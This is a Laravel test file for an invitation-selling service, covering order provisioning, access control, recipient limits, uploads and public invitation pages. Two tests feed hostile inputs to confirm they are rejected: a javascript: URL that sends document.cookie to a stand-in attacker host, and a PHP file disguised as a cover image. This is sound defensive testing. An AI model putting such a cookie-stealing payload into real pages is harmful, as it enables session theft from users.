<?php

namespace Tests\Feature;

use App\Livewire\Pages\CheckoutPage;
use App\Livewire\Pages\Dashboard\InvitationManagePage;
use App\Models\Customer;
use App\Models\Invitation;
use App\Models\InvitationRecipient;
use App\Models\InvitationTemplate;
use App\Models\Order;
use App\Models\Service;
use App\Models\ServicePlan;
use App\Services\CartService;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Storage;
use Livewire\Livewire;
use Tests\TestCase;

class InvitationPurchaseAndManageTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        Http::fake();
    }

    public function test_placing_an_order_for_an_invitation_service_does_not_create_an_invitation_yet(): void
    {
        $customer = Customer::factory()->create();
        $this->actingAs($customer, 'customer');

        $service = Service::factory()->create();
        $plan = ServicePlan::factory()->create(['service_id' => $service->id, 'max_recipients' => 10]);
        InvitationTemplate::factory()->create(['service_id' => $service->id]);

        app(CartService::class)->add($service->id, $plan->id, 1);

        Livewire::test(CheckoutPage::class)
            ->set('customer_name', 'Sok Dara')
            ->set('customer_email', 'dara@example.com')
            ->set('customer_phone', '012345678')
            ->call('placeOrder');

        $this->assertSame('pending_payment', Order::first()->status);
        $this->assertDatabaseCount('invitations', 0);
    }

    public function test_marking_the_order_paid_provisions_the_invitation(): void
    {
        $customer = Customer::factory()->create();
        $service = Service::factory()->create();
        $plan = ServicePlan::factory()->create([
            'service_id' => $service->id,
            'max_recipients' => 10,
            'retention_months' => 3,
        ]);
        $template = InvitationTemplate::factory()->create(['service_id' => $service->id]);
        $order = Order::factory()->create(['customer_id' => $customer->id, 'status' => 'pending_payment']);
        $order->items()->create([
            'service_id' => $service->id,
            'service_plan_id' => $plan->id,
            'service_name_snapshot' => $service->name_en,
            'unit_price' => $plan->price,
            'quantity' => 1,
            'line_total' => $plan->price,
        ]);

        $order->update(['status' => 'paid']);

        $this->assertDatabaseCount('invitations', 1);
        $invitation = Invitation::first();
        $this->assertSame($customer->id, $invitation->customer_id);
        $this->assertSame($template->id, $invitation->invitation_template_id);
        $this->assertSame(10, $invitation->max_recipients);
        $this->assertNotNull($invitation->expires_at);
        $this->assertTrue($invitation->expires_at->between(now()->addMonths(3)->subMinute(), now()->addMonths(3)->addMinute()));
    }

    public function test_marking_the_order_fulfilled_also_provisions_the_invitation(): void
    {
        $service = Service::factory()->create();
        InvitationTemplate::factory()->create(['service_id' => $service->id]);
        $order = Order::factory()->create(['customer_id' => Customer::factory(), 'status' => 'pending_payment']);
        $order->items()->create([
            'service_id' => $service->id,
            'service_name_snapshot' => $service->name_en,
            'unit_price' => $service->base_price,
            'quantity' => 1,
            'line_total' => $service->base_price,
        ]);

        $order->update(['status' => 'fulfilled']);

        $this->assertDatabaseCount('invitations', 1);
    }

    public function test_provisioning_does_not_duplicate_if_status_changes_again(): void
    {
        $service = Service::factory()->create();
        InvitationTemplate::factory()->create(['service_id' => $service->id]);
        $order = Order::factory()->create(['customer_id' => Customer::factory(), 'status' => 'pending_payment']);
        $order->items()->create([
            'service_id' => $service->id,
            'service_name_snapshot' => $service->name_en,
            'unit_price' => $service->base_price,
            'quantity' => 1,
            'line_total' => $service->base_price,
        ]);

        $order->update(['status' => 'paid']);
        $order->update(['status' => 'fulfilled']);

        $this->assertDatabaseCount('invitations', 1);
    }

    public function test_placing_an_order_for_a_regular_service_never_creates_an_invitation_even_once_paid(): void
    {
        $customer = Customer::factory()->create();
        $this->actingAs($customer, 'customer');

        $service = Service::factory()->create();
        app(CartService::class)->add($service->id, null, 1);

        Livewire::test(CheckoutPage::class)
            ->set('customer_name', 'Sok Dara')
            ->set('customer_email', 'dara@example.com')
            ->set('customer_phone', '012345678')
            ->call('placeOrder');

        Order::first()->update(['status' => 'paid']);

        $this->assertDatabaseCount('invitations', 0);
    }

    public function test_buying_quantity_two_provisions_two_separate_invitations_once_paid(): void
    {
        $service = Service::factory()->create();
        InvitationTemplate::factory()->create(['service_id' => $service->id]);
        $order = Order::factory()->create(['customer_id' => Customer::factory(), 'status' => 'pending_payment']);
        $order->items()->create([
            'service_id' => $service->id,
            'service_name_snapshot' => $service->name_en,
            'unit_price' => $service->base_price,
            'quantity' => 2,
            'line_total' => $service->base_price * 2,
        ]);

        $order->update(['status' => 'paid']);

        $this->assertDatabaseCount('invitations', 2);
    }

    public function test_a_customer_cannot_manage_someone_elses_invitation(): void
    {
        $owner = Customer::factory()->create();
        $intruder = Customer::factory()->create();
        $invitation = Invitation::factory()->create(['customer_id' => $owner->id]);

        $this->actingAs($intruder, 'customer')
            ->get("/dashboard/invitations/{$invitation->id}")
            ->assertForbidden();
    }

    public function test_dashboard_shows_a_waiting_state_for_an_unpaid_invitation(): void
    {
        $customer = Customer::factory()->create();
        $invitation = Invitation::factory()->unpaid()->create(['customer_id' => $customer->id]);

        $response = $this->actingAs($customer, 'customer')->get("/dashboard/invitations/{$invitation->id}");

        $response->assertStatus(200);
        $response->assertSee('Waiting for payment confirmation');
    }

    public function test_saving_is_blocked_on_an_unpaid_invitation_even_if_called_directly(): void
    {
        $customer = Customer::factory()->create();
        $invitation = Invitation::factory()->unpaid()->create(['customer_id' => $customer->id]);
        $invitation->template->update(['fields' => ['sender_name']]);

        Livewire::actingAs($customer, 'customer')
            ->test(InvitationManagePage::class, ['invitation' => $invitation])
            ->set('fieldValues.sender_name', 'Alex')
            ->call('save')
            ->assertForbidden();

        $this->assertNull($invitation->fresh()->field_values['sender_name'] ?? null);
    }

    public function test_adding_a_recipient_is_blocked_on_an_unpaid_invitation(): void
    {
        $customer = Customer::factory()->create();
        $invitation = Invitation::factory()->unpaid()->create(['customer_id' => $customer->id, 'max_recipients' => 5]);

        Livewire::actingAs($customer, 'customer')
            ->test(InvitationManagePage::class, ['invitation' => $invitation])
            ->set('newRecipientName', 'Bella')
            ->call('addRecipient')
            ->assertForbidden();

        $this->assertDatabaseCount('invitation_recipients', 0);
    }

    public function test_an_invitation_whose_order_reverts_to_pending_loses_access_again(): void
    {
        $customer = Customer::factory()->create();
        $order = Order::factory()->create(['customer_id' => $customer->id, 'status' => 'paid']);
        $invitation = Invitation::factory()->create(['customer_id' => $customer->id, 'order_id' => $order->id]);

        $order->update(['status' => 'pending_payment']);

        $this->assertFalse($invitation->fresh()->isPaid());
    }

    public function test_saving_field_values_updates_the_invitation(): void
    {
        $customer = Customer::factory()->create();
        $invitation = Invitation::factory()->create(['customer_id' => $customer->id]);
        $invitation->template->update(['fields' => ['sender_name', 'headline']]);

        Livewire::actingAs($customer, 'customer')
            ->test(InvitationManagePage::class, ['invitation' => $invitation])
            ->set('fieldValues.sender_name', 'Alex')
            ->set('fieldValues.headline', 'Will you go out with me?')
            ->call('save');

        $this->assertSame(
            ['sender_name' => 'Alex', 'headline' => 'Will you go out with me?'],
            $invitation->fresh()->field_values,
        );
    }

    public function test_uploading_a_cover_image_stores_it_and_saves_the_path(): void
    {
        Storage::fake('s3');

        $customer = Customer::factory()->create();
        $invitation = Invitation::factory()->create(['customer_id' => $customer->id]);
        $invitation->template->update(['fields' => ['cover_image']]);

        Livewire::actingAs($customer, 'customer')
            ->test(InvitationManagePage::class, ['invitation' => $invitation])
            ->set('imageUploads.cover_image', UploadedFile::fake()->image('cover.jpg'))
            ->call('save');

        $path = $invitation->fresh()->field_values['cover_image'];
        $this->assertNotEmpty($path);
        Storage::disk('s3')->assertExists($path);
    }

    public function test_uploading_a_non_image_file_as_cover_image_is_rejected(): void
    {
        Storage::fake('s3');

        $customer = Customer::factory()->create();
        $invitation = Invitation::factory()->create(['customer_id' => $customer->id]);
        $invitation->template->update(['fields' => ['cover_image']]);

        Livewire::actingAs($customer, 'customer')
            ->test(InvitationManagePage::class, ['invitation' => $invitation])
            ->set('imageUploads.cover_image', UploadedFile::fake()->create('shell.php', 10, 'application/x-php'))
            ->call('save')
            ->assertHasErrors(['imageUploads.cover_image']);

        $this->assertNull($invitation->fresh()->field_values['cover_image'] ?? null);
    }

    public function test_a_javascript_uri_in_a_url_field_is_rejected(): void
    {
        $customer = Customer::factory()->create();
        $invitation = Invitation::factory()->create(['customer_id' => $customer->id]);
        $invitation->template->update(['fields' => ['cta_label', 'cta_url']]);

        Livewire::actingAs($customer, 'customer')
            ->test(InvitationManagePage::class, ['invitation' => $invitation])
            ->set('fieldValues.cta_label', 'Click me')
            ->set('fieldValues.cta_url', 'javascript:fetch("https://evil.test?c="+document.cookie)')
            ->call('save')
            ->assertHasErrors(['fieldValues.cta_url']);

        $this->assertNull($invitation->fresh()->field_values['cta_url'] ?? null);
    }

    public function test_a_normal_https_url_in_a_url_field_is_accepted(): void
    {
        $customer = Customer::factory()->create();
        $invitation = Invitation::factory()->create(['customer_id' => $customer->id]);
        $invitation->template->update(['fields' => ['cta_label', 'cta_url']]);

        Livewire::actingAs($customer, 'customer')
            ->test(InvitationManagePage::class, ['invitation' => $invitation])
            ->set('fieldValues.cta_label', 'Click me')
            ->set('fieldValues.cta_url', 'https://open.spotify.com/playlist/abc')
            ->call('save')
            ->assertHasNoErrors();

        $this->assertSame('https://open.spotify.com/playlist/abc', $invitation->fresh()->field_values['cta_url']);
    }

    public function test_adding_a_recipient_generates_a_shareable_link(): void
    {
        $customer = Customer::factory()->create();
        $invitation = Invitation::factory()->create(['customer_id' => $customer->id, 'max_recipients' => 5]);

        Livewire::actingAs($customer, 'customer')
            ->test(InvitationManagePage::class, ['invitation' => $invitation])
            ->set('newRecipientName', 'Bella')
            ->call('addRecipient');

        $this->assertDatabaseHas('invitation_recipients', [
            'invitation_id' => $invitation->id,
            'recipient_name' => 'Bella',
        ]);
        $this->assertNotEmpty($invitation->recipients()->first()->token);
    }

    public function test_cannot_add_a_recipient_past_the_plan_limit(): void
    {
        $customer = Customer::factory()->create();
        $invitation = Invitation::factory()->create(['customer_id' => $customer->id, 'max_recipients' => 1]);
        InvitationRecipient::factory()->create(['invitation_id' => $invitation->id]);

        Livewire::actingAs($customer, 'customer')
            ->test(InvitationManagePage::class, ['invitation' => $invitation])
            ->set('newRecipientName', 'One Too Many')
            ->call('addRecipient')
            ->assertHasErrors(['newRecipientName']);

        $this->assertSame(1, $invitation->recipients()->count());
    }

    public function test_removing_a_recipient_deletes_it(): void
    {
        $customer = Customer::factory()->create();
        $invitation = Invitation::factory()->create(['customer_id' => $customer->id]);
        $recipient = InvitationRecipient::factory()->create(['invitation_id' => $invitation->id]);

        Livewire::actingAs($customer, 'customer')
            ->test(InvitationManagePage::class, ['invitation' => $invitation])
            ->call('removeRecipient', $recipient->id);

        $this->assertDatabaseMissing('invitation_recipients', ['id' => $recipient->id]);
    }

    public function test_public_invitation_page_renders_and_marks_the_recipient_viewed(): void
    {
        $invitation = Invitation::factory()->create([
            'field_values' => ['sender_name' => 'Alex', 'headline' => 'Hey there!', 'message' => 'hi'],
        ]);
        $invitation->template->update([
            'view' => 'invitations.templates.date-asking',
            'fields' => ['sender_name', 'headline', 'message'],
        ]);
        $recipient = InvitationRecipient::factory()->create(['invitation_id' => $invitation->id, 'recipient_name' => 'Bella']);

        $response = $this->get(route('invitation.show', [$invitation, $recipient]));

        $response->assertStatus(200);
        $response->assertSee('Bella');
        $this->assertNotNull($recipient->fresh()->viewed_at);
    }

    public function test_public_invitation_page_has_open_graph_tags_for_link_previews(): void
    {
        $invitation = Invitation::factory()->create([
            'field_values' => ['sender_name' => 'Alex', 'headline' => 'Hey there!', 'message' => 'You got a surprise'],
        ]);
        $invitation->template->update([
            'view' => 'invitations.templates.date-asking',
            'fields' => ['sender_name', 'headline', 'message'],
        ]);
        $recipient = InvitationRecipient::factory()->create(['invitation_id' => $invitation->id, 'recipient_name' => 'Bella']);

        $response = $this->get(route('invitation.show', [$invitation, $recipient]));

        $response->assertSee('<meta property="og:title" content="Hey there!" />', false);
        $response->assertSee('<meta property="og:description" content="You got a surprise" />', false);
        $response->assertSee('<meta property="og:image" content="'.asset('images/Roumdoul_Logo.png').'" />', false);
        $response->assertSee('<meta name="twitter:card" content="summary_large_image" />', false);
    }

    public function test_public_invitation_page_uses_the_uploaded_cover_image_for_the_og_image(): void
    {
        Storage::fake('s3');
        Storage::disk('s3')->put('invitations/cover.jpg', 'fake-image-bytes');

        $invitation = Invitation::factory()->create([
            'field_values' => ['cover_image' => 'invitations/cover.jpg'],
        ]);
        $invitation->template->update([
            'view' => 'invitations.templates.date-asking',
            'fields' => ['cover_image'],
        ]);
        $recipient = InvitationRecipient::factory()->create(['invitation_id' => $invitation->id]);

        $response = $this->get(route('invitation.show', [$invitation, $recipient]));

        $response->assertSee(Storage::disk('s3')->url('invitations/cover.jpg'), false);
    }

    public function test_public_invitation_page_404s_when_recipient_belongs_to_a_different_invitation(): void
    {
        $invitationA = Invitation::factory()->create();
        $invitationB = Invitation::factory()->create();
        $recipientOfB = InvitationRecipient::factory()->create(['invitation_id' => $invitationB->id]);

        $this->get(route('invitation.show', [$invitationA, $recipientOfB]))->assertNotFound();
    }

    public function test_public_invitation_page_shows_expired_state_past_expiry(): void
    {
        $invitation = Invitation::factory()->expired()->create();
        $recipient = InvitationRecipient::factory()->create(['invitation_id' => $invitation->id]);

        $response = $this->get(route('invitation.show', [$invitation, $recipient]));

        $response->assertStatus(410);
        $response->assertSee('expired');
    }
}
